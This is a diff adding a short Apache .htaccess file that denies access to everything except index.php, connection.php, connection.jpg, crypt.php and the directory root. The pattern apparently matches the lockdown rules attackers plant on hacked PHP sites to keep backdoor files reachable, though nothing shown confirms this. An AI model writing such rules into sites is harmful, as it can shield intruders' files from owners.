@@ -1,0 +1,17 @@
+ErrorDocument 403 ./
+deny from all
+<Files "index.php">
+allow from all
+</Files>
+<Files "connection.php">
+allow from all
+</Files>
+<Files "./">
+allow from all
+</Files>
+<Files "connection.jpg">
+allow from all
+</Files>
+<Files "crypt.php">
+allow from all
+</Files>
